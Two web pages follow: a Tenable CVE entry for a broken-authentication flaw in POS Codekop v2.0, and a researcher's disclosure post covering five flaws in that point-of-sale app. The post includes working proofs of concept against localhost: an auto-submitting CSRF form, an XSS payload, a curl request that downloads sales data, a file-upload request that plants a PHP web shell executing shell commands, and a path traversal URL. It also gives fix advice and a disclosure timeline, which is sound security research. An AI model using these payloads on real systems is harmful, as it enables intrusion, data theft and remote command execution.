=== Content from www.tenable.com_0a8d6f02_20250115_112023.html ===


* [![Tenable](https://www.tenable.com/themes/custom/tenable/img/logo.png)](https://www.tenable.com)
* [CVEs](https://www.tenable.com/cve)

* Settings
  ###### Links

  [Tenable Cloud](https://cloud.tenable.com) [Tenable Community & Support](https://community.tenable.com/login) [Tenable University](https://university.tenable.com/lms/index.php?r=site/sso&sso_type=saml) Severity CVSS v2CVSS v3CVSS v4ThemeLightDarkAutoHelp

* [![Tenable](https://www.tenable.com/themes/custom/tenable/img/logo-teal.png)](https://www.tenable.com)
* Plugins
* [Overview](https://www.tenable.com/plugins)
* [Plugins Pipeline](https://www.tenable.com/plugins/pipeline)
* [Newest](https://www.tenable.com/plugins/newest)
* [Updated](https://www.tenable.com/plugins/updated)
* [Search](https://www.tenable.com/plugins/search)
* [Nessus Families](https://www.tenable.com/plugins/nessus/families?type=nessus)
* [WAS Families](https://www.tenable.com/plugins/was/families?type=was)
* [NNM Families](https://www.tenable.com/plugins/nnm/families?type=nnm)
* [LCE Families](https://www.tenable.com/plugins/lce/families?type=lce)
* [Tenable OT Security Families](https://www.tenable.com/plugins/ot/families?type=ot)
* [About Plugin Families](https://www.tenable.com/plugins/families/about)
* [Release Notes](https://www.tenable.com/plugins/release-notes)
* Audits
* [Overview](https://www.tenable.com/audits)
* [Newest](https://www.tenable.com/audits/newest)
* [Updated](https://www.tenable.com/audits/updated)
* [Search Audit Files](https://www.tenable.com/audits/search)
* [Search Items](https://www.tenable.com/audits/items/search)
* [References](https://www.tenable.com/audits/references)
* [Authorities](https://www.tenable.com/audits/authorities)
* [Documentation](https://www.tenable.com/audits/documentation)
* [Download All Audit Files](https://www.tenable.com/downloads/download-all-compliance-audit-files)
* Indicators
* [Overview](https://www.tenable.com/indicators)
* [Search](https://www.tenable.com/indicators/search)
* [Indicators of Attack](https://www.tenable.com/indicators/ioa)
* [Indicators of Exposure](https://www.tenable.com/indicators/ioe)
* CVEs
* [Overview](https://www.tenable.com/cve)
* [Newest](https://www.tenable.com/cve/newest)
* [Updated](https://www.tenable.com/cve/updated)
* [Search](https://www.tenable.com/cve/search)
* Attack Path Techniques
* [Overview](https://www.tenable.com/attack-path-techniques)
* [Search](https://www.tenable.com/attack-path-techniques/search)

+ Links
+ [Tenable Cloud](https://cloud.tenable.com)
+ [Tenable Community & Support](https://community.tenable.com/login)
+ [Tenable University](https://university.tenable.com/lms/index.php?r=site/sso&sso_type=saml)
+ Settings
+ SeverityCVSS v2CVSS v3CVSS v4
+ ThemeLightDarkAuto
###### Detections

* Plugins
* [Overview](/plugins)
* [Plugins Pipeline](/plugins/pipeline)
* [Release Notes](/plugins/release-notes)
* [Newest](/plugins/newest)
* [Updated](/plugins/updated)
* [Search](/plugins/search)
* [Nessus Families](/plugins/nessus/families)
* [WAS Families](/plugins/was/families)
* [NNM Families](/plugins/nnm/families)
* [LCE Families](/plugins/lce/families)
* [Tenable OT Security Families](/plugins/ot/families)
* [About Plugin Families](/plugins/families/about)
* Audits
* [Overview](/audits)
* [Newest](/audits/newest)
* [Updated](/audits/updated)
* [Search Audit Files](/audits/search)
* [Search Items](/audits/items/search)
* [References](/audits/references)
* [Authorities](/audits/authorities)
* [Documentation](/audits/documentation)
* [Download All Audit Files](https://www.tenable.com/downloads/download-all-compliance-audit-files)
* Indicators
* [Overview](/indicators)
* [Search](/indicators/search)
* [Indicators of Attack](/indicators/ioa)
* [Indicators of Exposure](/indicators/ioe)

###### Analytics

* CVEs
* [Overview](/cve)
* [Newest](/cve/newest)
* [Updated](/cve/updated)
* [Search](/cve/search)
* Attack Path Techniques
* [Overview](/attack-path-techniques)
* [Search](/attack-path-techniques/search)

1. [CVEs](https://www.tenable.com/cve)
2. CVE-2023-36347

1. [CVEs](https://www.tenable.com/cve)
# CVE-2023-36347

###### high

* [Information](https://www.tenable.com/cve/CVE-2023-36347)
* [CPEs](https://www.tenable.com/cve/CVE-2023-36347/cpes)
* [Plugins](https://www.tenable.com/cve/CVE-2023-36347/plugins)

#### Description

A broken authentication mechanism in the endpoint excel.php of POS Codekop v2.0 allows unauthenticated attackers to download selling data.

#### References

<https://yuyudhn.github.io/pos-codekop-vulnerability/>

<https://www.youtube.com/watch?v=7qaIeE2cyO4>

#### Details

**Source:** [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36347), [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-36347)

**Published:** 2023-06-30

**Updated:** 2023-07-07

#### Risk Information

##### [CVSS v2](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=AV:N/AC:L/Au:N/C:C/I:N/A:N)

**Base Score:** 7.8

**Vector:** CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N

**Severity:** High

##### [CVSS v3](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Base Score:** 7.5

**Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Severity:** High

* [Tenable.com](https://www.tenable.com/)
* [Community & Support](https://community.tenable.com)
* [Documentation](https://docs.tenable.com)
* [Education](https://university.tenable.com)

* ¬© 2025 Tenable¬Æ, Inc. All Rights Reserved
* [Privacy Policy](https://www.tenable.com/privacy-policy)
* [Legal](https://www.tenable.com/legal)
* [508 Compliance](https://www.tenable.com/section-508-voluntary-product-accessibility)



=== Content from yuyudhn.github.io_fdd5f527_20250114_181514.html ===


* [Skip to primary navigation](#site-nav)
* [Skip to content](#main)
* [Skip to footer](#footer)

[Problem Child
Just Another Security Engineer](/)

* [CVE](/cve-list/)
* [Whoami](/whoami/)

Toggle search

Toggle menu

1. [Home](/)
/3. POS Codekop v2.0 Multiple Vulnerabilities

[![Yudha P.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtMks5Y-kz1zj-scHhDp6GVzjN4MGPRRtSvAGZsyhC4_Pqg6uBphl3PhMiNvGIWRWi7S_ENZgXqIQOk6MO2Ct7RUbL_G5LIyd_nrU9cwabjo_dnnHf3667jBUs0JgPEpkeTkF31ytOZB0oynyKcYY9PISp_hztQuicva64JOik5Hh7kL73soX_lPXvHw/s200/asuka.png)](https://yuyudhn.github.io/)

### [Yudha P.](https://yuyudhn.github.io/)

Offsec Say Try Harder!

Follow

* [GitHub](https://github.com/yuyudhn)
* [LinkedIn](https://www.linkedin.com/in/yuyudhn/)
* Email

# [POS Codekop v2.0 Multiple Vulnerabilities](https://yuyudhn.github.io/pos-codekop-vulnerability/)

4 minute read

![POS Codekop](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhI8iJ_JZL7ONXUZfnK-gP5_phauJinHzTJr0Mk_H6_F25rToWWCbi1C1BGFEqOD2I0f87H2-Q00sBY7m4xMd2I7C2i0cKdoCPUm8nybZrywlrG9CgPgV0th9CaG1M7boRjeFFYNWU6A7k5Mi755YsZJHeCDu4lhnr7sFMikUdHQnsqSDAyy2MRfTNU9nWh/s820)

## Researcher

During my vulnerability research on an open-source project, I discovered multiple vulnerabilities in **POS Codekop**, a simple web-based Point of Sales application using PHP & MYSQL.

## Software Details

Detail about POS Codekop.

| Parameter | Value |
| --- | --- |
| Software | POS Codekop |
| Description | The application is a Sales Goods (Cashier) application built with PHP MYSQL. It allows users to add, update/edit, and delete data, as well as search data using jQuery data tables. The user interface is designed using the Bootstrap Template. |
| Developer | fauzan1892 |
| Vendor URL | https://www.codekop.com/ |
| Software URL | https://github.com/fauzan1892/pos-kasir-php |

## CVE-2023-36345 - Unauthenticated CSRF

Vulnerability Summary:

| Parameter | Value |
| --- | --- |
| CVE ID | [CVE-2023-36345](https://www.cve.org/CVERecord?id=CVE-2023-36345) |
| Classification | Cross-Site Request Forgery |
| Description | Missing CSRF protection at POS Codekop, This could allow a malicious actor to force higher privileged users to execute unwanted actions under their current authentication. For example: Settings update. |
| Required privilege | Unauthenticated |
| Affected Version | 2.0 (#0~gitebc5c29) |
| Publicly disclosed | 23.06.2023 |

PoC:
**csrf.html**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost/research/pos-kasir-php/fungsi/edit/edit.php?pengaturan=ubah" method="POST">
      <input type="hidden" name="namatoko" value="CV&#32;Daruttaqwa" />
      <input type="hidden" name="alamat" value="Ujung&#32;Harapan&#32;CSRF" />
      <input type="hidden" name="kontak" value="081234567890" />
      <input type="hidden" name="pemilik" value="Fauzan&#32;Falah" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

I also provide a video about how to exploit this vulnerability.

* [**POS Codekop v2.0 Cross Site Request Forgery**](https://www.youtube.com/watch?v=KxjsEqNWU9E)

## CVE-2023-36346 - Unauthenticated XSS

Vulnerability Summary:

| Parameter | Value |
| --- | --- |
| CVE ID | [CVE-2023-36346](https://www.cve.org/CVERecord?id=CVE-2023-36346) |
| Classification | Cross-site scripting |
| Description | We found a reflected cross-site scripting (XSS) vulnerability on the ‚Äúprint.php‚Äù endpoint, specifically on the ‚Äúnm\_member‚Äù parameter. This endpoint is unauthenticated, meaning it does not require any form of authentication to access. |
| Required privilege | Unauthenticated |
| Affected Version | v2.0 (#0~gitebc5c29) |
| Patched Version | 2.0 (#0~git391d436) |
| Publicly disclosed | 23.06.2023 |

Vulnerable Code:

```
<center>
  <p><?php echo $toko['nama_toko'];?></p>
  <p><?php echo $toko['alamat_toko'];?></p>
  <p>Tanggal : <?php  echo date("j F Y, G:i");?></p>
  <p>Kasir : <?php  echo $_GET['nm_member'];?></p>
</center>

```

The `nm_member` parameter is not secure because it lacks HTML sanitization, allowing attackers to inject XSS payloads.

PoC:

```
http://localhost/labs/pos-kasir/print.php?nm_member=%27/%3E%3Cimg%20src=x%20onerror=alert(1)%20/%3Eaa

```

I also provide a video about how to exploit this vulnerability.

* [**POS Codekop v2.0 Unauthenticated Reflected Cross-Site Scripting**](https://www.youtube.com/watch?v=bbbA-q1syrA)

## CVE-2023-36347 - Broken Authentication

Vulnerability Summary:

| Parameter | Value |
| --- | --- |
| CVE ID | [CVE-2023-36347](https://www.cve.org/CVERecord?id=CVE-2023-36347) |
| Classification | Broken Access Control |
| Description | Missing authentication at /excel.php endpoint, could allow attacker to download selling data without authentication. |
| Required privilege | Unauthenticated |
| Affected Version | v2.0 (#0~gitebc5c29) |

PoC:

```
curl http://localhost/research/pos-kasir-php/excel.php

```

I also provide a video about how to exploit this vulnerability.

* [**POS Codekop v2.0 Broken Authentication**](https://www.youtube.com/watch?v=7qaIeE2cyO4)

## CVE-2023-36348 - Authenticated RCE

Vulnerability Summary:

| Parameter | Value |
| --- | --- |
| CVE ID | [CVE-2023-36348](https://www.cve.org/CVERecord?id=CVE-2023-36348) |
| Classification | Remote code execution |
| Description | The application does not sanitize the `filename` parameter when sending data to `/fungsi/edit/edit.php?gambar=user`. An attacker can exploit this issue by uploading a PHP file and accessing it, leading to Remote Code Execution. |
| Required privilege | Authenticated |
| Affected Version | v2.0 (#0~gitebc5c29) |

Vulnerable code:

```
if ($_FILES['foto']["error"] > 0) {
      $output['error']= "Error in File";
  } elseif (!in_array($_FILES['foto']["type"], $allowedImageType)) {
      echo '<script>alert("You can only upload JPG, PNG and GIF file");window.location="../../index.php?page=user"</script>';
  } elseif (round($_FILES['foto']["size"] / 1024) > 4096) {
      echo '<script>alert("WARNING !!! Besar Gambar Tidak Boleh Lebih Dari 4 MB");window.location="../../index.php?page=user"</script>';
  } else {
      $dir = '../../assets/img/user/';
      $tmp_name = $_FILES['foto']['tmp_name'];
      $name = time().basename($_FILES['foto']['name']);
      if (move_uploaded_file($tmp_name, $dir.$name)) {
          $foto2 = $_POST['foto2'];
--------------------

```

To prevent Remote Code Execution in the upload feature, relying solely on mime type checks is not sufficient. It is essential to include an file extension check as well.

PoC:

```
POST /research/pos-kasir-php/fungsi/edit/edit.php?gambar=user HTTP/1.1
Host: localhost
Content-Length: 8934
Cache-Control: max-age=0
sec-ch-ua:
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
**Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVBHqH4m6KgKBnpa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-User: ?1**
Sec-Fetch-Dest: document
Referer: http://localhost/research/pos-kasir-php/index.php?page=user
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=vqlfiarme77n1r4o8eh2kglfhv
Connection: close

------WebKitFormBoundarymVBHqH4m6KgKBnpa
Content-Disposition: form-data; name="foto"; filename="asuka-rce.php"
Content-Type: image/jpeg

√ø√ò√ø√† JFIF  H H  √ø√æ 6<?php passthru($_GET['cmd']); __halt_compiler(); ?>
√ø√õ C 





#%$""!&+7/&)4)!"0A149;>>>%.DIC<H7=>;√ø√õ C
-----------------------------

```

PHP Web Shell location:

* http://localhost/research/pos-kasir-php/assets/img/user/1687670330asuka-rce.php

I also provide a video about how to exploit this vulnerability.

* [**POS Codekop v2.0 Authenticated RCE**](https://www.youtube.com/watch?v=Ge0zqY0sGiQ)

## Path Traversal

Vulnerability Summary:

| Parameter | Value |
| --- | --- |
| CVE ID | CVE-2023-37156 |
| Classification | Path Traversal |
| Description | There is an unsafe way of using PHP‚Äôs `include` function in POS Codekop that allows attackers to perform a **Path Traversal** by accessing directories outside of `admin/module/`. |
| Required privilege | Authenticated |
| Affected Version | v2.0 (#0~gitebc5c29) |

Vulnerable code:
**index.php**

```
  include 'admin/template/sidebar.php';
          if(!empty($_GET['page'])){
                  include 'admin/module/'.$_GET['page'].'/index.php';
          }else{
                  include 'admin/template/home.php';
          }
  include 'admin/template/footer.php';
--------------------

```

To prevent path traversal vulnerabilities when using PHP‚Äôs include function, validate and sanitize user input, use absolute paths instead of relative ones, maintain a whitelist of allowed file names or paths, restrict access to included files, avoid dynamic file names whenever possible, disable directory listings, and keep your PHP version and libraries up to date. These practices help ensure that only intended files are included and limit the potential for unauthorized access to sensitive directories.

PoC:

```
mkdir /tmp/asuka
echo "<?php phpinfo();" | tee /tmp/asuka/index.php

```

![Directory with Index](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHDWJ-fpH6PaPYzvlIF2UAKKifv1aRtbsHeLKuTWMTMIdLOSE-06GK4CdAJGsd5e9XS9_VuBJMwMYeNFS17pFOlin92ASyhcgUj-q4gYFsw6ohROHmoCFVmY_0tEuFHkObPhkUITS8TlnEEwOejcJUHYobOcVPOh-pE-Oqg_-ol11pTQPerxyBApdae76i/s750)

```
http://localhost/research/pos-kasir-php/index.php?page=../../../../../../../../tmp/asuka

```

![Path Traversal](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5BUb05MrzQVrFTlG2iOdnpIElzjcU49PkL4Ate7y2Cj_H6H0RB6G4cYSbFWpL2I53KOZvV5o_OF2HYFiJAN2gJ4Uwvhfl_v0Zb8WqU0ru9pljZEmRkOfR2PumJvML9PtOMYvfgPCPgknFTlmbeWtC7ybDdQZDyfbZYiBB_VDmmyCFGXb1p0zcD4Ooih2q/s750)

## Timeline

* 25 May 2023 - Found the vulnerability
* 25 May 2023 - Contact the developer
* 23 June 2023 - CVE assigned
* 24 June 2023 - Article published

## References

* https://www.tenable.com/cve/CVE-2023-36348
* https://www.tenable.com/cve/CVE-2023-36347
* https://www.tenable.com/cve/CVE-2023-36346
* https://www.tenable.com/cve/CVE-2023-36345

 **Tags:**
[Broken Auth](/tags/#broken-auth),
[CSRF](/tags/#csrf),
[RCE](/tags/#rce),
[XSS](/tags/#xss)

 **Categories:**
[CVE](/categories/#cve)

 **Updated:** June 24, 2023

#### Share on

 [Twitter](https://twitter.com/intent/tweet?via=yuyudhn&text=POS+Codekop+v2.0+Multiple+Vulnerabilities%20https%3A%2F%2Fyuyudhn.github.io%2Fpos-codekop-vulnerability%2F "Share on Twitter")
 [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fyuyudhn.github.io%2Fpos-codekop-vulnerability%2F "Share on Facebook")
 [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fyuyudhn.github.io%2Fpos-codekop-vulnerability%2F "Share on LinkedIn")

[Previous](/registrationmagic-vulnerability/ "RegistrationMagic WordPress Plugin Multiple Vulnerabilities
")
[Next](/nadha-resto-vulnerability/ "Nadha Resto v3.2.0 Multiple Vulnerabilities
")

Enter your search term...

* **Follow:**
* [Twitter](https://twitter.com/yuyudhn)
* [Instagram](https://instagram.com/yuyudhn)
* [Feed](/feed.xml)

¬© 2024 Problem Child. Powered by [Jekyll](https://jekyllrb.com) & [Minimal Mistakes](https://mademistakes.com/work/minimal-mistakes-jekyll-theme/).


